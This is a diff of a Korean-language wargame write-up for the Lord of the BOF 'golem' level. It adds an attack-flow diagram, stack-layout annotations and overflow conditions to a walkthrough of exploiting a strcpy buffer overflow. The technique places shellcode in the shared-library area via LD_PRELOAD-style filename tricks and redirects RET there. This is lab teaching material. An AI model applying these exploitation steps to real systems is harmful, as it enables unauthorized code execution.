@@ -1,20 +1,25 @@
 ============================================================================================================
-[lob] skeleton
+[redhat-lob] (11) golem
 ============================================================================================================
 
+.. graphviz::
+
+    digraph foo {
+        a -> b -> c -> d -> e;
+
+        a [shape=box, label="argv[1] value"];
+        b [shape=box, color=lightblue, label="strcpy"];
+        c [shape=box, label="Buffer Overflow"];
+        d [shape=box, label="RET"];
+        e [shape=box, label="program name address"];
+    }
+
+|
 
 source code
 ============================================================================================================
 
-해당 문제 소스코드는 다음과 같습니다.
-
 .. code-block:: c
-
-    /*
-        The Lord of the BOF : The Fellowship of the BOF
-        - golem
-        - stack destroyer
-    */
 
     #include <stdio.h>
     #include <stdlib.h>
@@ -45,23 +50,25 @@ source code
         memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
     }
 
+|
 
 
-Buffer Overflow
+Vulnerabliity Vector
 ============================================================================================================
 
-스택 메모리 공간에 다음과 같이 들어가게 됩니다.
+스택 메모리 공간에 다음과 같이 들어가게 된다.
 
 .. code-block:: console
 
     ================
     LOW     
     ----------------
-    Buffer  (40byte) <- strcpy
+    Buffer  (40byte)
     SFP     (4byte)
-    RET     (4byte)
-    argc    (4byte)
-    argv    (4byte)
+    RET     (4byte)  <- strcpy overflow
+    argc    (4byte)  <- 0x00000002
+    argv[0] (4byte)  <- argv[0] address
+    argv[1] (4byte)  <- argv[1] address
     ----------------
     HIGH    
     ================
@@ -71,12 +78,16 @@ Buffer Overflow
 Segmentation fault
 ============================================================================================================
 
-strcpy로 인해 입력한 값이 버퍼보다 클 경우 오버플로우가 발생됩니다.
+Overflow condition 
 
-※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행해야 합니다.
+- argv[1] value의 47번째 문자가 "\\xbf"이어야 함
+- 사용한 메모리 전체 초기화로 인해, 프로그램에서 사용한 메모리 주소로 버퍼오버플로우를 진행할 수 없다
+
 
 .. code-block:: console
 
+    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
+    $ bash2
     $ ./golem `python -c 'print "a"*47'`
 
     stack is still your friend.
@@ -94,9 +105,9 @@ exploit
 쉘코드 파일명을 공유 라이브러리로 등록
 --------------------------------------------------------------------------------------------------------------
 
-기존에 사용한 쉘코드에는 \x2f 값이 있기 때문에 정상적으로 쉘코드가 동작하지 않습니다.
+기존에 사용한 쉘코드에는 "\\x2f" 값이 있기 때문에 정상적으로 쉘코드가 동작하지 않습니다.
 
-\x2f가 없는 쉘코드로 파일명을 생성하도록 합니다.
+"\\x2f"가 없는 쉘코드로 파일명을 생성하도록 합니다.
 
 공유 라이브러리 영역에 쉘코드로 파일명을 등록합니다.
 
@@ -162,8 +173,9 @@ RET 주소를 공유 라이브러리 로드 주소로 변경하여 공격 진행
     Buffer  (40byte) <- "\x90"*40
     SFP     (4byte)  <- "\x90"*4
     RET     (4byte)  <- shared libc address
-    argc    (4byte)  
-    argv    (4byte)  
+    argc    (4byte)  <- 0x00000002
+    argv[0] (4byte)  <- argv[0] 주소
+    argv[1] (4byte)  <- argv[1] 주소
     ----------------
     HIGH    
     ================
